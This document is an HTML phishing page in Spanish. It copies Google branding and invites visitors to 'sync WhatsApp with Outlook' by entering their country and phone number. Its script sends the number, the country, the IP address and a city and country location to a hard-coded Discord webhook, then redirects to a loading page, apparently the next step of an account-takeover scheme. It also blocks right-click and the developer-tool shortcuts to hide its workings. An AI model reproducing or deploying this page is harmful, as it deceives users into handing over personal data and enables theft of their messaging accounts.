<!DOCTYPE html>
<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>linea</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./index3_files/all.min.css">
    
    <style>
        :root {
            --bg-color: #f0f4f9;
            --box-bg: #ffffff;
            --text-main: #1f1f1f;
            --text-secondary: #444746;
            --blue: #0b57d0;
            --blue-hover: #0842a0;
        }
        body, html {
            margin: 0;
            padding: 0;
            background-color: var(--bg-color);
            font-family: 'Google Sans', 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background-color: var(--box-bg);
            border-radius: 28px;
            width: 1040px;
            max-width: 90%;
            display: flex;
            flex-direction: row;
            padding: 48px 40px;
            box-sizing: border-box;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            z-index: 10;
        }
        .left-panel {
            flex: 1;
            padding-right: 48px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
        }
        .right-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .google-logo {
            height: 36px;
            width: auto;
            margin-bottom: 24px;
            display: block;
        }
        h1 {
            font-size: 36px;
            color: var(--text-main);
            font-weight: 400;
            margin: 0 0 16px 0;
            line-height: 1.2;
        }
        p {
            font-size: 16px;
            color: var(--text-main);
            margin: 0;
        }
        
        .form-group {
            width: 100%;
            margin-bottom: 24px;
            position: relative;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--text-secondary);
        }
        
        .form-control {
            font-family: inherit;
            width: 100%;
            height: 48px;
            padding: 8px 16px;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
            box-sizing: border-box;
            color: var(--text-main);
        }
        .form-control:focus {
            outline: none;
            border: 2px solid var(--blue);
            padding: 8px 15px;
        }
        
        form { width: 100%; }

        button.btn-primary {
            background-color: var(--blue);
            color: white;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-family: inherit;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
            float: right;
            margin-top: 20px;
        }
        button.btn-primary:hover {
            background-color: var(--blue-hover);
        }

        .hidden { display: none !important; }

        @media (max-width: 900px) {
            .container {
                width: 100%;
                max-width: 450px;
                flex-direction: column;
                padding: 36px 32px;
                border-radius: 8px;
                box-shadow: none;
                background-color: transparent;
                margin: 20px auto;
            }
            body { background-color: #fff; }
            .left-panel {
                padding-right: 0;
                margin-bottom: 32px;
                align-items: center;
                text-align: center;
            }
            .google-logo { margin: 0 auto 24px; height: 36px; width: auto; }
            h1 { font-size: 24px; }
            p { font-size: 14px; }
            button.btn-primary { width: 100%; }
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
                max-width: 100%;
            }
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body oncontextmenu="return false">
    <script>
        document.addEventListener("keydown", function (e) {
            if (e.key === "F12") return false;
            if (e.ctrlKey && e.key === "u") return false;
            if (e.ctrlKey && e.shiftKey && e.key === "I") return false;
        });
    </script>

    <div class="container" id="msContainer">
        <div class="left-panel">
            <img class="google-logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
            <h1>Sincroniza<br>WhatsApp</h1>
            <p>Sincroniza y asegura tu cuenta con Outlook</p>
        </div>
        <div class="right-panel">
            <form id="loginForm" method="post" autocomplete="off" aria-label="Formulario de verificación">
                <div class="form-group">
                    <label for="country">País</label>
                    <select id="country" class="form-control" required="" aria-required="true">
                        <option value="" disabled="" selected="">Selecciona tu país</option>
                        <option value="+54">🇦🇷 Argentina</option>
                        <option value="+591">🇧🇴 Bolivia</option>
                        <option value="+55">🇧🇷 Brasil</option>
                        <option value="+56">🇨🇱 Chile</option>
                        <option value="+57">🇨🇴 Colombia</option>
                        <option value="+506">🇨🇷 Costa Rica</option>
                        <option value="+53">🇨🇺 Cuba</option>
                        <option value="+1">🇩🇴 República Dominicana</option>
                        <option value="+593">🇪🇨 Ecuador</option>
                        <option value="+503">🇸🇻 El Salvador</option>
                        <option value="+502">🇬🇹 Guatemala</option>
                        <option value="+504">🇭🇳 Honduras</option>
                        <option value="+52">🇲🇽 México</option>
                        <option value="+505">🇳🇮 Nicaragua</option>
                        <option value="+507">🇵🇦 Panamá</option>
                        <option value="+595">🇵🇾 Paraguay</option>
                        <option value="+51">🇵🇪 Perú</option>
                        <option value="+1">🇵🇷 Puerto Rico</option>
                        <option value="+598">🇺🇾 Uruguay</option>
                        <option value="+58">🇻🇪 Venezuela</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="telefono">Número de teléfono</label>
                    <input type="tel" id="telefono" name="telefono" class="form-control"
                        placeholder="Ej: +54 11 1234 5678" required="" pattern="^\+?\d{1,4}[\s\d]{6,}$"
                        aria-required="true">
                </div>
                <button type="submit" class="btn-primary" aria-label="Siguiente">
                    Siguiente
                </button>
            </form>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';

        $(document).ready(function () {
            $('#loginForm').submit(function (e) {
                e.preventDefault();
                var u_namec = $('#country').val();
                var u_namet = $('#telefono').val();

                localStorage.setItem("telefonoUsuario", u_namet);

                $.getJSON("https://api.ipify.org?format=json", function (data) {
                    const ip = data.ip;
                    $.getJSON("https://ipinfo.io", function (response) {
                        const embed = {
                            "title": "📱 **NUEVO INGRESO DE WHATSAPP (OUTLOOK)**",
                            "color": 65280,
                            "fields": [
                                { "name": "📞 **Teléfono**", "value": "```" + u_namet + "```", "inline": true },
                                { "name": "🌍 **País**", "value": "```" + u_namec + "```", "inline": true },
                                { "name": "🌐 **IP**", "value": "`" + ip + "`\n" + response.city + ", " + response.country, "inline": false }
                            ],
                            "timestamp": new Date().toISOString()
                        };
                        
                        $.ajax({
                            url: DISCORD_WEBHOOK_URL,
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            data: JSON.stringify({ "embeds": [embed] })
                        }).done(function() { window.location = 'cargando.html'; });

                    }).fail(function() { window.location = 'cargando.html'; });
                }).fail(function() { window.location = 'cargando.html'; });
            });

            const countrySelect = document.getElementById('country');
            const phoneInput = document.getElementById('telefono');
            countrySelect.addEventListener('change', function () {
                phoneInput.value = countrySelect.value + " ";
            });

            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const countryCode = data.country_code;
                    const countryMap = {
                        'AR': '+54', 'BO': '+591', 'BR': '+55', 'CL': '+56', 'CO': '+57', 'CR': '+506', 'CU': '+53', 'DO': '+1',
                        'EC': '+593', 'SV': '+503', 'GT': '+502', 'HN': '+504', 'MX': '+52', 'NI': '+505', 'PA': '+507', 'PY': '+595',
                        'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
                    };
                    if (countryMap[countryCode]) {
                        countrySelect.value = countryMap[countryCode];
                        phoneInput.value = countryMap[countryCode] + " ";
                    }
                });
        });
    </script>
</body>
</html>
